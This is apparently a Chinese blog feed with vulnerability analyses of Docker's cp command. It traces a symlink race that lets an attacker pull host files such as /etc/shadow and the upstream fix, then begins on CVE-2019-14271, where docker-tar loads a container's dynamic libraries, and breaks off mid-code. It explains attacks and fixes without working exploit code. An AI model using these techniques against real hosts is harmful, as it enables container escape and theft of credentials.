srcStat.Mode&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>linkTarget := srcStat.LinkTarget<br><span class="hljs-keyword">if</span> !system.IsAbs(linkTarget) &#123;<br>srcParent, _ := archive.SplitPathDirEntry(srcPath)<br>linkTarget = filepath.Join(srcParent, linkTarget)<br>&#125;<br><br>linkTarget, rebaseName = archive.GetRebaseName(srcPath, linkTarget)<br>srcPath = linkTarget<br>&#125;<br><br>&#125;<br><br>content, stat, err := dockerCli.Client().CopyFromContainer(ctx, srcContainer, srcPath)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 statContainerPath函数会将文件路径信息和容器信息发送到daemon的“head &#x2F;container&#x2F;(containerID)&#x2F;archive”接口。CopyFromContainer函数会将文件路径信息和容器信息发送到daemon的“get &#x2F;container&#x2F;(containerID)&#x2F;archive”接口</p><h3 id="Head-container-containerID-archive-：文件路径转换"><a href="#Head-container-containerID-archive-：文件路径转换" class="headerlink" title="Head &#x2F;container&#x2F;(containerID)&#x2F;archive ：文件路径转换"></a>Head &#x2F;container&#x2F;(containerID)&#x2F;archive ：文件路径转换</h3><p> 该接口daemon主要负责将path信息进行安全转换，daemon的处理逻辑如下(&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;copy.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> headContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>stat, err := s.backend.ContainerStatPath(v.Name, v.Path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">return</span> setContainerPathStatHeader(stat, w.Header())<br>&#125;<br></code></pre></td></tr></table></figure><p>ContainerStatPath函数经过一系列函数调用后会调用到FollowSymlinkInScope函数(&#x2F;pkg&#x2F;symlink&#x2F;fs.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FollowSymlinkInScope</span><span class="hljs-params">(path, root <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>path, err := filepath.Abs(filepath.FromSlash(path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>root, err = filepath.Abs(filepath.FromSlash(root))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> evalSymlinksInScope(path, root)<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数将路径进行一个安全的转换，将在作用域 <code>root</code> 中评估 <code>path</code> 中的符号链接，并返回在调用时保证包含在 <code>root</code> 范围内的结果。<br>例如： &#x2F;foo&#x2F;bar -&gt; &#x2F;outside<br>FollowSymlinkInScope(“&#x2F;foo&#x2F;bar”, “&#x2F;foo”) &#x3D;&#x3D; “&#x2F;foo&#x2F;outside”，而不是”&#x2F;outside”<br>经过FollowSymLinkInScope函数转换后的路径将会被返回给docker client。</p><h3 id="Get-container-containerID-archive：文件打包"><a href="#Get-container-containerID-archive：文件打包" class="headerlink" title="Get &#x2F;container&#x2F;(containerID)&#x2F;archive：文件打包"></a>Get &#x2F;container&#x2F;(containerID)&#x2F;archive：文件打包</h3><p>docker client接收到daemon安全转换后的路径后并没有立即使用该路径，而是经过一些处理后使用CopyFromContainer函数发送给daemon的“get &#x2F;container&#x2F;(containerID)&#x2F;archive”接口。这个间隙就是该漏洞产生的原因。<br>daemon接受到该接口传来的信息后会根据路径信息和容器信息进行文件的打包工作，并将打包好的文件通过response返回给docker client。daemon的处理逻辑如下(&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;copy.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> getContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>tarArchive, stat, err := s.backend.ContainerArchivePath(v.Name, v.Path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> tarArchive.Close()<br><br><span class="hljs-keyword">if</span> err := setContainerPathStatHeader(stat, w.Header()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>w.Header().Set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-tar&quot;</span>)<br><span class="hljs-keyword">return</span> writeCompressedResponse(w, r, tarArchive)<br>&#125;<br></code></pre></td></tr></table></figure><p>s.backend.ContainerArchivePath函数会经过一系列函数调用后调用到TarWithOptions函数(&#x2F;pkg&#x2F;archive&#x2F;archive.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TarWithOptions</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *TarOptions)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>tb, err := NewTarballer(srcPath, options)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">go</span> tb.Do()<br><span class="hljs-keyword">return</span> tb.Reader(), <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先创建了一个新的Tarballer对象并调用该对象的Do函数进行文件打包。Do函数又会调用到addTarFile函数(&#x2F;pkg&#x2F;archive&#x2F;archive.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ta *tarAppender)</span></span> addTarFile(path, name <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">if</span> fi.Mode()&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>link, err = os.Readlink(path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>在addTarFile函数中会首先判断路径下文件的软链接信息，如果有软链接就将软链接指向的文件打包进最终的文件中。但是此步骤是在宿主机路径下进行解析的，所以如果攻击者在FollowSymlinkInScope转换后，addTarFile使用前对目标文件添加一个恶意的软链接，如“&#x2F;etc&#x2F;shadow”，那addTarFile进行软链接解析的时候会将宿主机的&#x2F;etc&#x2F;shadow打包进最终的文件中返回给docker client。</p><h2 id="修复代码分析"><a href="#修复代码分析" class="headerlink" title="修复代码分析"></a>修复代码分析</h2><h3 id="暂时性修复措施"><a href="#暂时性修复措施" class="headerlink" title="暂时性修复措施"></a>暂时性修复措施</h3><p>官方建议用户在使用docker cp命令前执行docker pause命令，并在结束cp命令后执行docker unpause。pause和unpause命令被自动加入到cp命令的运行过程中，通过冻结容器的方式阻断copy过程中对容器文件数据的篡改。</p><h3 id="根本性修复措施"><a href="#根本性修复措施" class="headerlink" title="根本性修复措施"></a>根本性修复措施</h3><p>（git commit id : 364f9bce16e8c95c79fc68d23867e871f20cb452）<br>官方代码修复链接：<a href="https://github.com/moby/moby/pull/39292">https://github.com/moby/moby/pull/39292</a><br>漏洞的提出者指出该漏洞的根本修复方法在于修改chrootarchive中的归档逻辑，因此官方修复后的代码主要是对Do函数进行了限制，让其在容器的文件系统下进行打包而不是宿主机的文件系统下。(&#x2F;pkg&#x2F;chrootarchive&#x2F;archive_unix.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">invokePack</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *archive.TarOptions, root <span class="hljs-type">string</span>)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>...<br>err = goInChroot(root, tb.Do)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>goInChroot函数将tb.Do的执行范围限制在了<code>root</code>范围下，即容器的目录下。(&#x2F;pkg&#x2F;chrootarchive&#x2F;chroot_linux.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">goInChroot</span><span class="hljs-params">(path <span class="hljs-type">string</span>, fn <span class="hljs-keyword">func</span>()</span></span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> unshare.Go(<br>unix.CLONE_FS|unix.CLONE_NEWNS,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := mount.MakeRSlave(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> mounttree.SwitchRoot(path)<br>&#125;,<br>fn,<br>)<br>&#125;<br></code></pre></td></tr></table></figure><p>goInChroot函数调用了unshare.Go函数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Go</span><span class="hljs-params">(flags <span class="hljs-type">int</span>, setupfn <span class="hljs-keyword">func</span>()</span></span> <span class="hljs-type">error</span>, fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>...<br><span class="hljs-keyword">if</span> err := unix.Unshare(flags); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- os.NewSyscallError(<span class="hljs-string">&quot;unshare&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> setupfn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := setupfn(); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- err<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(started)<br><br><span class="hljs-keyword">if</span> fn != <span class="hljs-literal">nil</span> &#123;<br>fn()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> &lt;-started<br>&#125;<br></code></pre></td></tr></table></figure><p>将goInChroot和unshare.Go函数结合起来看，我们可以发现修复后做限制的逻辑是：</p><ul><li>开启一个goroutine进行文件打包操作</li><li>对开启的这个goroutine使用unshare系统调用赋予其新的Mount命名空间，并且与父进程共享一套文件系统（在后续的版本中使用reexec代替了此部操作）</li><li>使用mounttree.SwitchRoot(path)进行chroot</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-14271 docker cp漏洞分析</title>
    <link href="/cll58pows0008kcut6wvr99tf/"/>
    <url>/cll58pows0008kcut6wvr99tf/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-14271-docker-cp漏洞分析"><a href="#CVE-2019-14271-docker-cp漏洞分析" class="headerlink" title="CVE-2019-14271 docker cp漏洞分析"></a>CVE-2019-14271 docker cp漏洞分析</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞是由于docker cp从不受信任的位置加载了动态库所导致的。当用户运行docker cp命令时，docker会调用docker-tar，docker-untar命令对文件进行打包。而在打包动作之前会先使用chroot进入容器内部。但非静态编译版本的docker在docker-tar的打包过程中会加载外部动态库，由于已经chroot进入了容器内部，所以此时会加载容器内部的动态库。攻击者可以通过替换容器内部的动态库进行攻击。</p><h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>下载docker源码，将源码切换到该cve未修复的某个commit处查看源码。<br>当用户使用docker cp命令时，docker client会向docker daemon提供的api接口发送请求。docker daemon接受到请求后会根据请求的不同进行打包和解包的操作。此漏洞出现在docker daemon打包的过程中。此处对docker daemon打包过程的代码简要分析：<br>当用户使用docker cp从容器中向宿主机中复制文件时，docker client会向docker daemon的”get &#x2F;containers&#x2F;(containerID)&#x2F;archive”接口发送请求，请求体包括打包的文件信息和容器的相关信息。docker daemon接受到请求后进入如下处理流程：（&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;copy.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> getContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>tarArchive, stat, err := s.backend.ContainerArchivePath(v.Name, v.Path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> tarArchive.Close()<br><br><span class="hljs-keyword">if</span> err := setContainerPathStatHeader(stat, w.Header()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>w.Header().Set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-tar&quot;</span>)<br><span class="hljs-keyword">return</span> writeCompressedResponse(w, r, tarArchive)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其中<code>s.backend.ContainerArchivePath</code>函数经过一系列函数调用后会调用到<code>invokerPack</code>函数（&#x2F;pkg&#x2F;chrootarchive&#x2F;archive_unix.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">invokePack</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *archive.TarOptions, root <span class="hljs-type">string</span>)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>...<br>cmd := reexec.Command(<span class="hljs-string">&quot;docker-tar&quot;</span>, relSrc, root)<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数使用reexec库调用了<code>docker-tar</code>命令对应的执行逻辑。在&#x2F;pkg&#x2F;chrootarchive&#x2F;init_unix.go的<code>init</code>函数中进行了docker-tar命令的注册：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>reexec.Register(<span class="hljs-string">&quot;docker-applyLayer&quot;</span>, applyLayer)<br>reexec.Register(<span class="hljs-string">&quot;docker-untar&quot;</span>, untar)<br>reexec.Register(<span class="hljs-string">&quot;docker-tar&quot;</span>, tar)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以此时程序会调用到<code>tar</code>函数(&#x2F;pkg&#x2F;chrootarchive&#x2F;archive_unix.go)，该函数的具体处理逻辑为：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">tar</span><span class="hljs-params">()</span></span> &#123;<br>...<br><span class="hljs-keyword">if</span> err := realChroot(root); err != <span class="hljs-literal">nil</span> &#123;<br>fatal(err)<br>&#125;<br><br>...<br><br>rdr, err := archive.TarWithOptions(src, &amp;options)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>首先会通过<code>realChroot</code>函数进行chroot进入容器内部。（&#x2F;pkg&#x2F;chrootarchive&#x2F;chroot_linux.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">realChroot</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := unix.Chroot(path); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;Error after fallback to chroot: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> err := unix.Chdir(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;Error changing to new root after chroot: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用<code>TarWithOptions</code>函数进行文件打包操作（&#x2F;pkg&#x2F;archive&#x2F;archive.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TarWithOptions</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *TarOptions)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ta := newTarAppender(<br>idtools.NewIDMappingsFromMaps(options.UIDMaps, options.GIDMaps),<br>compressWriter,<br>options.ChownOpts,<br>)<br>...<br>       <span class="hljs-keyword">if</span> err = ta.addTarFile(filePath, relFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>logrus.Errorf(<span class="hljs-string">&quot;Can&#x27;t add file %s to tar: %s&quot;</span>, filePath, err)<br><span class="hljs-comment">// if pipe is broken, stop writing tar stream to it</span><br><span class="hljs-keyword">if</span> err == io.ErrClosedPipe &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> pipeReader, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>TarWithOptions</code>函数会创建一个tarAppender对象，并调用其<code>addTarFile</code>函数将文件进行打包（&#x2F;pkg&#x2F;archive&#x2F;archive.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ta *tarAppender)</span></span> addTarFile(path, name <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>...<br>hdr, err := FileInfoHeader(name, fi, link)<br>...<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>addTarFile</code>函数使用<code>FileInfoHeader</code>函数根据文件信息和链接信息获取一个填充了更多信息的tar.Header。<code>FileInfoHeader</code>函数会调用到go标准库<code>archive/tar</code>中的<code>FileInfoHeader</code>函数（go&#x2F;libexec&#x2F;src&#x2F;archive&#x2F;tar&#x2F;common.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FileInfoHeader</span><span class="hljs-params">(fi fs.FileInfo, link <span class="hljs-type">string</span>)</span></span> (*Header, <span class="hljs-type">error</span>) &#123;<br>...<br>    <span class="hljs-keyword">if</span> sysStat != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> h, sysStat(fi, h)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过上述代码可以发现，当sysStat不为空时会调用到sysStat所代表的函数。而在go&#x2F;libexec&#x2F;src&#x2F;archive&#x2F;tar&#x2F;stat_unix.go的<code>init</code>函数中对sysStat进行了赋值：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>sysStat=statUnix<br>&#125;<br></code></pre></td></tr></table></figure><p>因此，我们会调用到<code>statUnix</code>函数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">statUnix</span><span class="hljs-params">(fi fs.FileInfo, h *Header)</span></span> <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">if</span> u, ok := userMap.Load(h.Uid); ok &#123;<br>h.Uname = u.(<span class="hljs-type">string</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> u, err := user.LookupId(strconv.Itoa(h.Uid)); err == <span class="hljs-literal">nil</span> &#123;<br>h.Uname = u.Username<br>userMap.Store(h.Uid, h.Uname)<br>&#125;<br><span class="hljs-keyword">if</span> g, ok := groupMap.Load(h.Gid); ok &#123;<br>h.Gname = g.(<span class="hljs-type">string</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> g, err := user.LookupGroupId(strconv.Itoa(h.Gid)); err == <span class="hljs-literal">nil</span> &#123;<br>h.Gname = g.Name<br>groupMap.Store(h.Gid, h.Gname)<br>&#125;<br> ...<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在该函数中使用到了<code>user.LookupId</code>和<code>user.LookupGroupId</code>两个函数来获取用户和用户组信息。以LookupId为例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LookupId</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> u, err := Current(); err == <span class="hljs-literal">nil</span> &amp;&amp; u.Uid == uid &#123;<br><span class="hljs-keyword">return</span> u, err<br>&#125;<br><span class="hljs-keyword">return</span> lookupUserId(uid)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lookupUserId</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">return</span> lookupUnixUid(i)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lookupUserId</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">return</span> lookupUnixUid(i)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lookupUnixUid</span><span class="hljs-params">(uid <span class="hljs-type">int</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br>...<br>err := retryWithBuffer(userBuffer, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(buf []<span 